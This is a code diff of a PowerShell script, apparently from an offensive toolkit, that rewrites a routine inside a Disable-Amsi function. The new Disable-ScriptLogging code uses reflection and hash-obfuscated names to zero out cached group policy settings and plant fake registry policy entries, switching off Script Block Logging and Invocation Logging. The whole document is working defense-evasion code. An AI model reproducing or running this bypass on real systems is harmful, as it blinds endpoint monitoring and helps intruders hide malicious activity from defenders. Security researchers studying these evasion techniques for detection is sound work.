@@ -723,20 +723,62 @@ function Disable-Amsi
         return $false
     }
 
-    function BlockLoggingBypass
-    {
-        try
+    function Disable-ScriptLogging
+    { 
+        function ScriptLogging-Technique1
         {
             $asm = [AppDomain]::CurrentDomain.GetAssemblies() | ? {$_.Location -and ((Get-Hash($_.Location.Split('\')[-1])) -eq 65764965518)}
             $mytype = $asm.GetTypes() | ? {(Get-Hash($_.Name)) -eq 12579468197}
             $foo = $mytype.GetFields([System.Reflection.BindingFlags]40) | ? {(Get-Hash($_.Name)) -eq 12250760746}
-            $foo.SetValue($null, (New-Object 'System.Collections.Generic.HashSet[string]'))
-            return $true
+            $out = $foo.GetValue($null)
+            $k0 = ""
+            foreach ($item in $out){
+                if((Get-Hash($item)) -eq 32086076268) { # ScrXiptBloXckLogXging
+                    $k0 = $item
+                    break
+                }
+            }
+            #$foo.SetValue($null,(New-Object Collections.Generic.HashSet[string]))
+            Write-Host "[+] Finished applying technique 1"
+            return $k0
         }
-        Catch
+
+        function ScriptLogging-Technique2($k0)
         {
-            return $false
+            $asm = [AppDomain]::CurrentDomain.GetAssemblies() | ? {$_.Location -and ((Get-Hash($_.Location.Split('\')[-1])) -eq 65764965518)}  # SysXtem.ManaXgement.AutomaXtion.dll
+            $mytype = $asm.GetTypes() | ? {(Get-Hash($_.Name)) -eq 4572158998} # UXtils
+            $foo = $mytype.GetFields([System.Reflection.BindingFlags]40) | ? {(Get-Hash($_.Name)) -eq 52485150955} # caXchedGrXoupPoXlicySettXings
+            if(-not $foo -or $foo -eq $null) {
+                $foo = $mytype.GetFields([System.Reflection.BindingFlags]40) | ? {(Get-Hash($_.Name)) -eq 56006640029} # s_caXchedGrXoupPoXlicySettXings
+            }
+
+            if($foo) {
+                $cache = $foo.GetValue($null)
+                $k1 = $cache.Keys | ? {(Get-Hash($_.Split('\\')[-1])) -eq 32086076268} # ScrXiptBloXckLogXging
+                if($k1 -and $cache[$k1]) {
+                    $k2 = $cache[$k1].Keys | ? {(Get-Hash($_)) -eq 45083803091} # EnabXleScrXiptBloXckLogXging
+                    $k3 = $cache[$k1].Keys | ? {(Get-Hash($_)) -eq 70211596397} # EnabXleScrXiptBloXckInvocXationLogXging
+                    if($k2 -and $cache[$k1][$k2]) {
+                        $cache[$k1][$k2] = 0
+                    }
+                    if($k3 -and $cache[$k1][$k3]) {
+                        $cache[$k1][$k3] = 0
+                    }
+                }
+
+                $vl = [System.Collections.Generic.Dictionary[string,System.Object]]::new()
+                $vl.Add('Enabl'+'e'+$k0, 0)
+                $k01 = $k0 -replace 'kL', 'kInvocationL'
+                $vl.Add('Ena'+'ble'+$k01, 0)
+                $cache['HKEY_LOCAL_M'+'ACHINE\Software\Policie'+'s\Microsoft\Wind'+'ows\PowerSh'+'ell\'+$k0] = $vl
+            }
+
+            Write-Host "[+] Finished applying technique 2"
         }
+
+        $out = ScriptLogging-Technique1
+        ScriptLogging-Technique2 $out
+        return $true
     }
 
     function Check-IsAdmin {
@@ -760,11 +802,11 @@ function Disable-Amsi
         }
 
         if ($DontDisableBlockLogging -eq $false) {
-            if (BlockLoggingBypass) {
+            if (Disable-ScriptLogging) {
                 Write-Host "[+] Disabled Script Block logging."
             }
             else {
-                Write-Host "[-] Could not disblae Script Block logging."
+                Write-Host "[-] Could not disable Script Block logging."
             }
         }
 
